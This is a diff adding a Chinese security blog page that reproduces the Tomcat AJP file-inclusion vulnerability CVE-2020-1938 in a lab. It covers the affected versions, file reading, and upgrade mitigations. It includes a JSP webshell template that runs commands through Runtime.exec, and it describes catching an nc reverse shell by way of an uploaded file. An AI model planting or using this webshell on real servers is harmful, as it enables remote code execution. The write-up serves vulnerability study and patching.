@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>CVE-2020-1938 Tomcat AJP复现 | Mari0er&#39;s Blog</title>
+<meta name="description" content="">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://mari0er.top/favicon.ico?v=1768205765236">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://mari0er.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://mari0er.top">
+        <img class="avatar" src="https://mari0er.top/images/avatar.png?v=1768205765236" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://mari0er.top">
+        <h1 class="site-title">Mari0er&#39;s Blog</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="https://mari0er.top/post/about.html" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+            <div class="feature-container" style="background-image: url('https://tuchuang.looklook.workers.dev/1010/tomcat-ghost.png')">
+            </div>
+          
+          <h2 class="post-title">CVE-2020-1938 Tomcat AJP复现</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-04-09</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://mari0er.top/tag/cve-2020-1938/">
+                    CVE-2020-1938
+                    
+                      ，
+                    
+                  </a>
+                
+                  <a href="https://mari0er.top/tag/tomcat-ajp/">
+                    tomcat ajp
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>  2月20日，国家信息安全漏洞共享平台（CNVD）发布了Apache Tomcat文件包含漏洞（CNVD-2020-10487/CVE-2020-1938）。该漏洞是由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若目标服务器同时存在文件上传功能，攻击者可进一步实现远程代码执行。</p>
+<!-- more -->
+<p>这里直接白嫖大佬的<a href="https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC">POC</a>，简单复现记录一下，造轮子是不可能的!</p>
+<h3 id="0x01-搭建漏洞环境">0x01 搭建漏洞环境</h3>
+<p>根据官方说明此次受影响版本如下，登录Tomcat官网选择适合的版本<a href="https://archive.apache.org/dist/tomcat/">下载即可</a>搭建。</p>
+<blockquote>
+<p>Apache Tomcat 9.x &lt; 9.0.31<br>
+Apache Tomcat 8.x &lt; 8.5.51<br>
+Apache Tomcat 7.x &lt; 7.0.100<br>
+Apache Tomcat 6.x</p>
+</blockquote>
+<h3 id="0x02-文件读取">0x02 文件读取</h3>
+<p>使用tomcat默认配置的情况下，可以直接读取tomcat目录文件，默认根目录为<strong>webapps/ROOT</strong>,test.txt为根目录下测试文件<br>
+<img src="https://tuchuang.looklook.workers.dev/1010/file_read.png" alt="file-read" loading="lazy"></p>
+<h3 id="0x03-文件包含rce">0x03 文件包含RCE</h3>
+<p>文件包含RCE需要先上传payload到tomcat目录。若上传一个jsp码到tomcat目录下，接着直接读取即可执行jsp代码。这里给一个简单的jsp码，补上你自己的利用代码即可。</p>
+<pre><code>&lt;%
+    java.io.InputStream in = Runtime.getRuntime().exec(&quot;补上利用代码&quot;).getInputStream();
+    int a = -1;
+    byte[] b = new byte[2048];
+    out.print(&quot;&lt;pre&gt;&quot;);
+    while((a=in.read(b))!=-1){
+        out.println(new String(b));
+    }
+    out.print(&quot;&lt;/pre&gt;&quot;);
+%&gt;
+</code></pre>
+<p>利用nc反弹shell为例，利用<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">在线payload生产器</a>可以快速生成利用代码，补在jsp码上即可。<br>
+<img src="https://tuchuang.looklook.workers.dev/1010/nc-e.png" alt="nc-e" loading="lazy"><br>
+上传jsp码到tomcat目录后直接读取该文件,可以解析为jsp文件执行。测试最多可以读取wabapps下所有目录和文件，也可以看看这篇<a href="https://github.com/mari0er/picture/blob/master/1010/Readme.md">总结</a>。<br>
+<img src="https://tuchuang.looklook.workers.dev/1010/nc.png" alt="nc" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://tuchuang.looklook.workers.dev/1010/nc-l.png" alt="nc-l" loading="lazy"></figure>
+<h3 id="0x04-漏洞防护">0x04 漏洞防护</h3>
+<p>目前官方已在最新版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护，官方修复版本下载链接：</p>
+<table>
+<thead>
+<tr>
+<th>版本号</th>
+<th style="text-align:center">下载地址</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache Tomcat 7.0.100</td>
+<td style="text-align:center">http://tomcat.apache.org/download-70.cgi</td>
+</tr>
+<tr>
+<td>Apache Tomcat 8.5.51</td>
+<td style="text-align:center">http://tomcat.apache.org/download-80.cgi</td>
+</tr>
+<tr>
+<td>Apache Tomcat 9.0.31</td>
+<td style="text-align:center">http://tomcat.apache.org/download-90.cgi</td>
+</tr>
+</tbody>
+</table>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://mari0er.top/post/netcat.html/">
+              <h3 class="post-title">
+                下一篇：Netcat使用总结
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan"></div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  待人友善是修养 独来独往是性格 | <a class="rss" href="https://mari0er.top/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
